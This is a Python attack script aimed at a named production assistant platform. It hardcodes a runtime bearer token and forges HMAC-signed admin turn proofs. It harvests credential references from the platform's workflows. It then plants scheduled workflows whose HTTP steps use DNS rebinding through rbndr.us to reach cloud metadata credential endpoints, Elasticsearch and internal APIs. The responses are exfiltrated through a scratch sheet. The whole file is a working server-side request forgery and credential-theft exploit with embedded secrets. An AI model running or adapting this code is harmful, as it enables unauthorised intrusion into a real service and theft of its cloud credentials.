#!/usr/bin/env python3
# intent 28623 - weaponise the apps/workflow HTTP step (the only non-LLM execution primitive
# reachable via body-actor admin when LUMII_TURN_PROOF_ENFORCE is on/off, using a self-signed v2
# proof made with our own per-runtime proof_key).
#   D) DNS rebinding TOCTOU: assertPublicHttpUrl does ONE dns.lookup, fetch() re-resolves ->
#      rbndr.us (TTL=1, single random A record) lands public on the check and internal on the fetch.
#      Targets: 169.254.0.23 / 169.254.169.254 metadata, 127.0.0.1:8788 internal api, 172.22.0.11:9200 ES.
#   success of an http step is written into a scratch sheet by a following `create` step and read
#   back through /internal/tickets/query.
import os, sys, json, time, base64, subprocess, re, hmac, hashlib

MODE = os.environ.get("PROBE_MODE", "full")
_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "results" in _REF:
    print("results-branch-skip", flush=True); sys.exit(0)

HOST = "assistant.lumiiai.cn"
ORG  = "org_bTLzxtBLmugV8uxx4QTyw"
RID  = "rt_KTWyBZUur4cjUsRGP3zRk"
RTOKEN = "jy3151agR2zGGHQ08X_m52K04nsfiVsYi7LEJNDRE4Q"
ADMIN = "usr_ZxLewKrgbRYSm7rWDtQX8"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
START = time.time()
def el(): return int(time.time() - START)

def _b64(s): return base64.b64encode(s.encode("utf-8", "replace")).decode()
def R(k, v):
    if not isinstance(v, str):
        try: s = json.dumps(v, ensure_ascii=False)
        except Exception: s = str(v)
    else:
        s = v
    print("R:%s:%s" % (k, _b64(s)), flush=True)
def log(*a): print("L: " + " ".join(str(x) for x in a), flush=True)

def curl(args, timeout=40):
    try:
        r = subprocess.run(["curl", "-s", "-k", "-m", str(timeout)] + args, capture_output=True, timeout=timeout + 15)
        return r.returncode, r.stdout, r.stderr[:300]
    except Exception as e:
        return -1, b"", repr(e)[:200]

def call(path, method="GET", body=None, hdrs=None, timeout=40, maxlen=200000):
    url = "https://%s%s" % (HOST, path)
    args = ["--http2", "-A", UA, "-H", "Accept: application/json",
            "-H", "Referer: https://%s/" % HOST, "-H", "Origin: https://%s" % HOST,
            "-w", "\n__CODE__%{http_code}"]
    if hdrs:
        for k, v in hdrs.items(): args += ["-H", "%s: %s" % (k, v)]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET":
        args += ["-X", method]
    args += [url]
    rc, out, err = curl(args, timeout=timeout)
    txt = out.decode("utf-8", "replace")
    code = ""
    i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    return {"path": path, "code": code, "body": txt[:maxlen], "len": len(txt),
            "err": (err.decode("utf-8", "replace") if isinstance(err, (bytes, bytearray)) else str(err))}

SK = "conv_28623probe"
PLATFORM = "dashboard"
PROOF_KEY = None

def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def make_proof(actor=ADMIN, sk=SK, platform=PLATFORM, ttl=1500):
    if not PROOF_KEY: return ""
    now = int(time.time())
    claims = {"session_key": sk, "platform": platform, "chat_id": sk, "actor_id": actor,
              "iss": RID, "aud": RID, "iat": now - 5, "exp": now + ttl}
    p = b64u(json.dumps(claims, separators=(",", ":")).encode())
    sig = b64u(hmac.new(PROOF_KEY.encode(), p.encode(), hashlib.sha256).digest())
    return "v2." + p + "." + sig

def internal(name, extra=None, maxlen=200000, actor=ADMIN, sk=SK):
    b = {"platform": PLATFORM, "actor_id": actor, "session_key": sk}
    if extra: b.update(extra)
    hdrs = {"Authorization": "Bearer " + RTOKEN, "x-agent-id": RID}
    pr = make_proof(actor=actor, sk=sk)
    if pr: hdrs["x-lumii-turn-proof"] = pr
    return call("/internal/" + name, "POST", b, hdrs=hdrs, maxlen=maxlen)

def J(r):
    try: return json.loads(r["body"])
    except Exception: return None

# ============ PHASE A ============
log("### A identity t=%ds" % el())
k = call("/api/runtimes/keys/current", hdrs={"x-agent-id": RID, "x-agent-token": RTOKEN})
R("A_keys", {"code": k["code"], "body": k["body"][:600]})
kj = {}
try:
    kj = json.loads(k["body"]); PROOF_KEY = kj.get("proof_key")
except Exception: pass
R("A_proofkey", {"have": bool(PROOF_KEY), "v": kj.get("proof_key_version")})

p = internal("projects/list", {}, maxlen=100000)
R("A_projects", {"code": p["code"], "body": p["body"][:6000]})

res = internal("tickets/resolve", {}, maxlen=400000)
R("A_resolve", {"code": res["code"], "body": res["body"][:60000]})
folders, sheets = [], []
rj = J(res) or {}
for f in (rj.get("folders") or []):
    if f.get("id"): folders.append({"id": f["id"], "name": f.get("name")})
for s in (rj.get("sheets") or []):
    if s.get("id"): sheets.append({"id": s["id"], "name": s.get("name")})
R("A_counts", {"folders": len(folders), "sheets": len(sheets), "resolve_code": res["code"]})

# hunt real credentialId references in existing prod workflows
cred_hits = []
for f in folders[:45]:
    if el() > 80: break
    w = internal("tickets/list-workflows", {"folder_id": f["id"]})
    j = J(w) or {}
    wfs = j.get("workflows") or []
    if wfs:
        R("B_wf_%s" % f["id"][-6:], {"code": w["code"], "n": len(wfs), "names": [x.get("name") for x in wfs][:12]})
    for x in wfs:
        blob = json.dumps(x, ensure_ascii=False)
        for m in re.finditer(r'"credentialId"\s*:\s*"([^"]+)"', blob):
            cred_hits.append({"cid": m.group(1), "wf": x.get("name"), "folder": f["id"]})
R("B_cred_hits", cred_hits[:40])
log("cred_hits=%d folders=%d sheets=%d t=%ds" % (len(cred_hits), len(folders), len(sheets), el()))

if MODE == "recon":
    R("DONE_RECON", {"t": el(), "cred_hits": len(cred_hits)})
    sys.exit(0)

# ============ PHASE C: scratch table + baseline proof that http step runs ============
log("### C scratch table t=%ds" % el())
cf = internal("tickets/create-folder", {"name": "rb28623", "icon": "grid", "description": "rb28623 probe scratch"})
R("C_create_folder", {"code": cf["code"], "body": cf["body"][:1500]})
cj = J(cf) or {}
sheet_id = (cj.get("sheet") or {}).get("id")
folder_id = (cj.get("folder") or {}).get("id")
FKEY = None
if sheet_id:
    sc = internal("tickets/schema", {"sheet_id": sheet_id})
    R("C_schema", {"code": sc["code"], "body": sc["body"][:1500]})
    sj = J(sc) or {}
    fs = sj.get("fields") or []
    if fs: FKEY = fs[0].get("key")
log("sheet=%s folder=%s field=%s" % (sheet_id, folder_id, FKEY))
R("C_ids", {"sheet": sheet_id, "folder": folder_id, "field": FKEY})

def make_wf(name, steps, once_in=40, extra=None):
    onceAt = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + once_in))
    wf = {"name": name[:60], "enabled": True,
          "trigger": {"kind": "schedule", "every": "once", "onceAt": onceAt},
          "steps": steps}
    if extra: wf.update(extra)
    r = internal("tickets/upsert-workflow", {"folder_id": folder_id, "workflow": wf})
    R("W_%s" % re.sub(r"[^A-Za-z0-9_]", "_", name)[:30], {"code": r["code"], "body": r["body"][:600]})
    return r

def read_records():
    q = internal("tickets/query", {"sheet_id": sheet_id, "limit": 100})
    qj = J(q) or {}
    return qj.get("records") or qj.get("rows") or []

def wait_tag(tag, prefix, wait_s=120):
    t0 = time.time()
    while time.time() - t0 < wait_s:
        for row in read_records():
            d = row.get("data") or {}
            for v in d.values():
                if isinstance(v, str) and prefix in v:
                    R("REC_%s" % tag, {"row": row.get("id"), "val": v[:6000]})
                    return v
        time.sleep(8)
    R("REC_%s" % tag, {"timeout": True})
    return None

base_ok = False
if sheet_id and FKEY and folder_id:
    make_wf("rb28623-base", [
        {"id": "h1", "kind": "http", "method": "GET", "url": "https://www.baidu.com/", "timeoutMs": 8000,
         "retry": {"times": 2, "intervalSec": 2}},
        {"id": "c1", "kind": "create", "sheetId": sheet_id, "values": {FKEY: "CTRL28623 {{h1.status}} {{h1.body}}"}},
    ], once_in=30)
    v = wait_tag("ctrl", "CTRL28623", 95)
    base_ok = (v is not None) and ("200" in v[:40])
    log("base_ok=%s t=%ds" % (base_ok, el()))
    R("C_base", {"ok": base_ok, "val": (v or "")[:200]})

# ============ PHASE D: DNS rebinding TOCTOU (CORRECTED DESIGN) ============
# ROOT-CAUSE of prior failure: pub partner 1.1.1.1:80 answers 409 to unknown Host ->
# execHttp sets noRetry=true and BREAKS on the first attempt (4xx<500!=429) => zero retries,
# never any chance to flip. FIX: use a public partner that returns 3xx (thrown BEFORE the
# status check => retried) AND closes the socket (HTTP/1.0) => no undici pooling on retry.
# 111.63.65.103 (baidu) :80 -> "HTTP/1.0 301" for arbitrary Host (verified). intervalSec>=4 > rbndr TTL=1.
PUB = "6f3f4167"    # 111.63.65.103 baidu edge: :80 -> "HTTP/1.0 301" (retried via 3xx, socket closed -> no pooling)
PUB2 = "c0000201"   # 192.0.2.1 TEST-NET: :80 connect TIMEOUT -> throws -> retried, guaranteed no pooling (deterministic hedge)
TARGETS = [
    # tag, pub, internal hexip, port, path, marker, intervalSec, times
    ("md023c",  PUB,  "a9fe0017", 80,   "/latest/meta-data/cam/security-credentials/", "MD023C ", 4, 6),
    ("md023",   PUB,  "a9fe0017", 80,   "/latest/meta-data/",                          "MD023 ",  4, 6),
    ("md254",   PUB,  "a9fea9fe", 80,   "/latest/meta-data/",                          "MD254 ",  4, 6),
    ("md023c_t",PUB2, "a9fe0017", 80,   "/latest/meta-data/cam/security-credentials/", "MD023CT ",5, 6),
    ("md254_t", PUB2, "a9fea9fe", 80,   "/latest/meta-data/",                          "MD254T ", 5, 6),
    ("es",      PUB,  "ac16000b", 9200, "/",                                           "ES ",     3, 6),
    ("c8080",   PUB,  "7f000001", 8080, "/api/config",                                 "C8080 ",  3, 6),
]
REPS = {"md023c": 3, "md023": 2, "md254": 2, "md023c_t": 2, "md254_t": 2, "es": 2, "c8080": 1}
if base_ok and sheet_id and FKEY:
    log("### D rebinding(corrected) t=%ds" % el())
    made = []
    n = 0
    for tag, pub, hexip, port, path, pref, iv, tm in TARGETS:
        for i in range(REPS.get(tag, 1)):
            n += 1
            once_in = 30 + (n * 10)
            steps = [
                {"id": "h1", "kind": "http", "method": "GET",
                 "url": "http://%s.%s.rbndr.us:%d%s" % (pub, hexip, port, path),
                 "timeoutMs": 5000, "retry": {"times": tm, "intervalSec": iv}},
                {"id": "c1", "kind": "create", "sheetId": sheet_id, "values": {FKEY: pref + "{{h1.status}}|{{h1.body}}"}},
            ]
            r = make_wf("rb28676-%s-%d" % (tag, i + 1), steps, once_in=once_in)
            made.append([tag, i + 1, r["code"]])
            time.sleep(0.3)
    R("D_made", made)
    R("D_pub", {"pub": PUB, "pub_ip": "111.63.65.103", "pub2": PUB2, "pub2_ip": "192.0.2.1"})
    # poll: create steps only run on 2xx http success (metadata) => a record with marker = real hit
    deadline = time.time() + 300
    found = {}
    seen_rows = []
    while time.time() < deadline:
        rows = read_records()
        for row in rows:
            rid = row.get("id")
            d = row.get("data") or {}
            rv = {"id": rid, "data": d}
            if rv not in seen_rows: seen_rows.append(rv)
            for v in d.values():
                if not isinstance(v, str): continue
                for spec in TARGETS:
                    tag, pref = spec[0], spec[5]
                    if v.startswith(pref.strip()) and tag not in found:
                        found[tag] = v
                        R("HIT_%s" % tag, {"row": rid, "val": v[:6000]})
        time.sleep(10)
    R("D_found", list(found.keys()))
    R("D_all_rows", seen_rows[:40])
    R("D_rows_n", len(seen_rows))
    log("rebind(corrected) found=%s t=%ds" % (list(found.keys()), el()))
else:
    R("D_skipped", {"base_ok": base_ok, "sheet": sheet_id, "field": FKEY})

R("DONE", {"t": el(), "base_ok": base_ok, "cred_hits": len(cred_hits)})
